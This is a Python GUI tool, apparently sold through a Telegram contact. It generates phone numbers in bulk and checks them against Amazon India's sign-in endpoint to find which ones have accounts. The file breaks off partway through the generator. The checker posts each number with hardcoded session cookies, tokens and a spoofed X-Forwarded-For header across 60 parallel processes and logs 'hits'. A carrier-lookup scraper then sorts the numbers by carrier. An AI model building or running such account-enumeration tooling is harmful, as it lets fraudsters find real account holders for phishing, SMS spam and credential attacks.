import os
import sys
import time
import random
import re
import threading
import multiprocessing
from multiprocessing import Pool, freeze_support
import tkinter as tk
from tkinter import ttk, messagebox, simpledialog
import tkinter.font as tkfont
import requests, urllib3
from bs4 import BeautifulSoup
from termcolor import colored
from colorama import init
from rich.progress import Progress

# --- Initialization & Global Variables ---
requests.packages.urllib3.disable_warnings()
init(autoreset=True)

# Global variables for Amazon validation progress
completed_tasks = 0
total_numbers = 0
progress_lock = threading.Lock()


# --- Utility Functions ---
def clear_file(filename):
    """Delete file if it already exists."""
    if os.path.exists(filename):
        os.remove(filename)


def clear_directory(directory):
    """Delete all files in the directory if it exists."""
    if os.path.exists(directory) and os.path.isdir(directory):
        for f in os.listdir(directory):
            file_path = os.path.join(directory, f)
            if os.path.isfile(file_path):
                os.remove(file_path)


def simulate_api_request(duration=3):
    for i in range(duration * 20):
        time.sleep(0.05)


# --- Amazon Checker (Validation) ---
class Amazon:
    session = None

    def __init__(self, num):
        self.url = "https://www.amazon.in/ap/signin"
        self.num = num.strip()
        if Amazon.session is None:
            Amazon.session = requests.Session()
        self.session = Amazon.session

    def check(self):
        cookies = {
            "session-id":
            "262-6899214-0753700",
            "session-id-time":
            "2289745062l",
            "i18n-prefs":
            "INR",
            "csm-hit": ("tb:6NWTTM14VJ00ZAVVBZ3X+b-36CP76CGQ52N3TB0HZG8|"
                        "1659025064788&t:1659025064788&adb:adblk_no"),
            "ubid-acbin":
            "257-4810331-3732018",
            "session-token":
            "\"tyoeHgowknphx0Y/CBaiVwnBiwbhUb1PRTvQZQ+07Tq9rmkRD6bErsUDwgq6gu+tA53K6WEAMwOb3pN4Ti3PSFoo+I/Jt5qIEDEMHIeRo1CrE264ogGDHsjge/CwWUZ9bVZtbo32ej/ZPQdm8bYeu6TQhca+UH7Wm9OOwBGoPl7dfoUk79QLYEz69Tt3ik4zMJom8jfgI227qMPuaMaAsw==\""
        }
        headers = {
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0",
            "Accept": ("text/html,application/xhtml+xml,application/xml;"
                       "q=0.9,image/avif,image/webp,*/*;q=0.8"),
            "Accept-Language":
            "en-US,en;q=0.5",
            "Accept-Encoding":
            "gzip, deflate",
            "DNT":
            "1",
            "Content-Type":
            "application/x-www-form-urlencoded",
            "Origin":
            "https://www.amazon.in",
            "Connection":
            "close",
            "X-Forwarded-For":
            "127.0.0.1",
            "Referer":
            ("https://www.amazon.in/ap/signin?"
             "openid.pape.max_auth_age=0&"
             "openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fref_%3Dnav_ya_signin&"
             "openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&"
             "openid.assoc_handle=inflex&"
             "openid.mode=checkid_setup&"
             "openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&"
             "openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&"),
            "Upgrade-Insecure-Requests":
            "1",
            "Sec-Fetch-Dest":
            "document",
            "Sec-Fetch-Mode":
            "navigate",
            "Sec-Fetch-Site":
            "same-origin",
            "Sec-Fetch-User":
            "?1"
        }
        data = {
            "appActionToken":
            "Aok8C9I71Cr17vp22ONGvDUXR8Yj3D",
            "appAction":
            "SIGNIN_PWD_COLLECT",
            "subPageType":
            "SignInClaimCollect",
            "openid.return_to":
            "ape:aHR0cHM6Ly93d3cuYW1hem9uLmluLz9yZWZfPW5hdl95YV9zaWduaW4=",
            "prevRID":
            "ape:MzZDUDc2Q0dRNTJOM1RCMEhaRzg=",
            "workflowState":
            ("eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0."
             "tCHWdlv4kSSigZCZiGfSCYgnReddxq7c0cUpf0dxYqYzWU-"
             "ZHIL0mQ.eP-cXQNtVyBr4q_g.fNRQAD5f18IU0nmqT7IwklJZV-_b60As-"
             "_dvyVd4MMjDpiMoGFJ0edbmuL8GJKT_BEE7ClwIpUYOtUtejr7v8qCRy4iD6bg_"
             "eBRSnTmZiXzVsx4EuL241zhoriZ7FpXS2seG82sx85C2udl1sPRQyKnO1zIqulOCechL_"
             "LzBmIRDv9ngzfij-nYmjWrDpZvAXiKCclR9v0UYh_SqjjOIrStMC53AlWjH-hYdDkXWSeTyHchFi9Ij4ndOgJb9tKNucA4_j7Uy-"
             "R0wvB9zlwEfQNa3394guXjjz6IR3TVMjw41bySCYbHLf6j5oj-5xh6UZm2CsW7DE5gqbHmlq5Nv8zLvTRTO9HJvM9Wr36R1eDRN."
             "wZAX4qr9VTROJR9qdWbHfw"),
            "email":
            self.num,
            "password":
            "",
            "create":
            "0",
            "metadata1":
            ("ECdITeCs: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"
             )
        }
        res = self.session.post(self.url,
                                headers=headers,
                                cookies=cookies,
                                data=data,
                                verify=False,
                                timeout=15).text

        if "ap_change_login_claim" in res:
            return True, res
        elif "There was a problem" in res:
            return False, res
        else:
            return False, res


def fun_action(num):
    num = num.strip()
    if num.isnumeric() and "+" not in num:
        num = "+%s" % num
    while True:
        try:
            valid, _ = Amazon(num).check()
            if valid:
                with open("Valid33.txt", "a", encoding="utf-8") as ff:
                    ff.write("%s\n" % num)
                print(colored("[+] Valid   ==> Hit %s" % num, "green"))
            else:
                print(colored("[-] Invalid ==> Bad %s" % num, "red"))
            break
        except Exception:
            continue


def process_numbers():
    """Process phone numbers from Gen.txt using a multiprocessing Pool."""
    global completed_tasks, total_numbers
    try:
        seen = set()
        numbers = []
        with open("Gen.txt", "r", encoding="Latin-1") as f:
            for line in f:
                num = line.strip()
                if num and num not in seen:
                    seen.add(num)
                    numbers.append(num)
        total_numbers = len(numbers)
        print(colored(f"Processing {total_numbers} entries...", 'yellow'))
        pool_size = 60
        with Pool(pool_size) as pool:
            for _ in pool.imap_unordered(fun_action, numbers):
                with progress_lock:
                    completed_tasks += 1
    except Exception as e:
        print(e)

# --- Phone Number Validator (Carrier Lookup) ---
class PhoneNumberValidator:

    def lookup_carrier_info(self, npa, nxx):
        url = f"https://www.area-codes.com/exchange/exchange.asp?npa={npa}&nxx={nxx}"
        headers = {
            'User-Agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
            '(KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
        }
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            all_text = soup.get_text()
            if all_text:
                carrier_match = re.search(r'Carrier/Company:(.*?)ZIP Code',
                                          all_text, re.DOTALL)
                if carrier_match:
                    carrier_info = carrier_match.group(1).strip()
                    print(colored(f"Carrier lookup for {npa}-{nxx}: {carrier_info}", "green"))
                    return carrier_info
        return None

    def process_batch(self, phone_numbers):
        valid_results = {}
        for line in phone_numbers:
            match = re.search(r'\+1 \((\d{3})\) (\d{3})-(\d{4})', line)
            if match:
                npa = match.group(1)
                nxx = match.group(2)
                carrier_info = self.lookup_carrier_info(npa, nxx)
                if carrier_info:
                    phone_number = re.sub(r'\D', '', line.strip().split("|")[0].strip())
                    if carrier_info not in valid_results:
                        valid_results[carrier_info] = [phone_number]
                    else:
                        valid_results[carrier_info].append(phone_number)
                    print(colored(f"{line.strip()} | Carrier: {carrier_info}", "green"))
                    with open("all_lookup_numbers.txt", "a") as f:
                        f.write(phone_number + "\n")
        return valid_results

    def run(self, input_filename):
        output_folder = "validated_numbers"
        os.makedirs(output_folder, exist_ok=True)
        # Clear the folder before lookup
        clear_directory(output_folder)
        valid_results = {}
        with open(input_filename, 'r') as file:
            lines = file.readlines()
        num_batches = 30
        batch_size = max(1, len(lines) // num_batches)
        batches = [lines[i:i + batch_size] for i in range(0, len(lines), batch_size)]
        pool = multiprocessing.Pool(processes=num_batches)
        results = pool.map(self.process_batch, batches)
        pool.close()
        pool.join()
        for batch_result in results:
            for carrier, numbers in batch_result.items():
                if carrier not in valid_results:
                    valid_results[carrier] = numbers
                else:
                    valid_results[carrier].extend(numbers)
        for carrier, numbers in valid_results.items():
            output_filename = os.path.join(output_folder, f"{carrier}.txt")
            with open(output_filename, 'w') as output_file:
                for phone_number in numbers:
                    output_file.write(phone_number + '\n')
        print(colored(f"{len(lines)} numbers processed. Valid numbers saved in their respective carrier files.", "cyan"))


# =============================================================================
#                     GUI Application Code with Animation
# =============================================================================

class AnimatedFrame(ttk.Frame):
    """
    A ttk.Frame with a slide-in animation.
    """
    def slide_in(self, direction="left", duration=300):
        self.update_idletasks()
        width = self.winfo_width() or self.master.winfo_width()
        steps = 20
        step_delay = duration // steps
        if direction == "left":
            start_x = -width
            delta = width / steps
        else:  # default or right
            start_x = self.master.winfo_width()
            delta = -width / steps
        # Place frame off-screen initially
        self.place(x=int(start_x), y=0, relwidth=1, relheight=1)

        def animate(step):
            new_x = start_x + delta * step
            self.place(x=int(new_x), y=0)
            if step < steps:
                self.after(step_delay, animate, step + 1)
        animate(0)


class MainApp(tk.Tk):
    def __init__(self, *args, **kwargs):
        tk.Tk.__init__(self, *args, **kwargs)
        self.title("Fraud Department - Phone Number Validation")
        self.geometry("600x500")
        self.resizable(False, False)
        self.configure(bg="#f0f0f0")

        # Configure ttk style
        style = ttk.Style(self)
        style.theme_use("clam")
        style.configure("TFrame", background="#f0f0f0")
        style.configure("TLabel", background="#f0f0f0", font=("Segoe UI", 11))
        style.configure("Header.TLabel", font=("Segoe UI", 16, "bold"),
                        background="#4a7abc", foreground="white", anchor="center")
        style.configure("TButton", font=("Segoe UI", 10))
        style.configure("TEntry", font=("Segoe UI", 10))
        style.configure("TCombobox", font=("Segoe UI", 10))

        # Create container for pages (using tk.Frame for better control with place)
        container = tk.Frame(self, bg="#f0f0f0")
        container.pack(side="top", fill="both", expand=True)

        self.frames = {}
        for F in (GeneratorPage, ValidationPage, CarrierLookupPage):
            page_name = F.__name__
            frame = F(parent=container, controller=self)
            self.frames[page_name] = frame
            # Use place to support animation
            frame.place(x=0, y=0, relwidth=1, relheight=1)

        self.check_license_key()
        self.show_frame("GeneratorPage")

    def show_frame(self, page_name):
        frame = self.frames[page_name]
        frame.tkraise()
        # Run the slide-in animation for a beautified transition
        if hasattr(frame, "slide_in"):
            frame.slide_in(direction="left", duration=300)
        if hasattr(frame, "on_show"):
            frame.on_show()

    def check_license_key(self):
        correct_key = "Anonymous123$"
        while True:
            key = simpledialog.askstring("License Key",
                                         "Please enter the license key:",
                                         show='*',
                                         parent=self)
            if key is None:
                self.destroy()
                sys.exit(0)
            if key == correct_key:
                break
            else:
                messagebox.showerror("Error",
                                     "Incorrect license key. Purchase a license key at https://t.me/Tizlion",
                                     parent=self)


# ----------------- Page 1: Phone Number Generator -----------------
class GeneratorPage(AnimatedFrame):
    def __init__(self, parent, controller):
        AnimatedFrame.__init__(self, parent)
        self.controller = controller

        header = ttk.Label(self, text="Phone Number Generator", style="Header.TLabel")
        header.pack(fill="x", pady=(0, 10))

        form_frame = ttk.Frame(self)
        form_frame.pack(pady=10, padx=20, fill="x")

        ttk.Label(form_frame, text="Select Country Code:").grid(row=0, column=0, sticky="w", pady=5)
        self.country_var = tk.StringVar(value="1")
        self.country_combo = ttk.Combobox(form_frame, textvariable=self.country_var, state="readonly",
                                          values=["1", "44", "61"])
        self.country_combo.grid(row=0, column=1, sticky="ew", pady=5)

        ttk.Label(form_frame, text="Area Codes (comma or space separated):").grid(row=1, column=0, sticky="w", pady=5)
        self.area_entry = ttk.Entry(form_frame)
        self.area_entry.grid(row=1, column=1, sticky="ew", pady=5)

        ttk.Label(form_frame, text="Prefixes (optional, comma or space separated):").grid(row=2, column=0, sticky="w", pady=5)
        self.prefix_entry = ttk.Entry(form_frame)
        self.prefix_entry.grid(row=2, column=1, sticky="ew", pady=5)

        ttk.Label(form_frame, text="How many phone numbers to generate:").grid(row=3, column=0, sticky="w", pady=5)
        self.count_entry = ttk.Entry(form_frame)
        self.count_entry.grid(row=3, column=1, sticky="ew", pady=5)
        form_frame.columnconfigure(1, weight=1)

        self.gen_progress = ttk.Progressbar(self, orient="horizontal", mode="determinate")
        self.gen_progress.pack(pady=10, padx=20, fill="x")
        self.progress_label = ttk.Label(self, text="Progress: 0%")
        self.progress_label.pack()

        button_frame = ttk.Frame(self)
        button_frame.pack(pady=10)
        self.generate_button = ttk.Button(button_frame, text="Generate", command=self.start_generation)
        self.generate_button.grid(row=0, column=0, padx=5)
        self.continue_button = ttk.Button(button_frame, text="Continue to Validate",
                                          command=self.go_to_validation, state="disabled")
        self.continue_button.grid(row=0, column=1, padx=5)

    def update_gen_progress(self, current, total, message=None):
        percent = (current / total * 100) if total else 0
        self.gen_progress['maximum'] = total
        self.gen_progress['value'] = current
        self.progress_label.config(text=f"Progress: {percent:.0f}%")
        if message:
            self.progress_label.config(text=message)

    def start_generation(self):
        self.generate_button.config(state="disabled")
        threading.Thread(target=self.generate_numbers_thread, daemon=True).start()

    def generate_numbers_thread(self):
        try:
            country_code = self.country_var.get().strip()
            area_codes_raw = self.area_entry.get().strip()
            prefixes_raw = self.prefix_entry.get().strip()
            count_str = self.count_entry.get().strip()
            if not (area_codes_raw and count_str):
                messagebox.showerror("Input Error", "Please fill in the required fields (area codes and number count).",
                                     parent=self)
                self.generate_button.config(state="normal")
                return
            try:
                num_count = int(count_str)
                if num_count <= 0:
                    raise ValueError
            except ValueError:
                messagebox.showerror("Input Error", "Please enter a positive integer for the number count.", parent=self)
                self.generate_button.config(state="normal")
                return

            area_codes = [code.strip() for code in re.split(r'[,\s]+', area_codes_raw) if code.isdigit()]
            if not area_codes:
                messagebox.showerror("Input Error", "Please enter valid area codes (numeric).", parent=self)
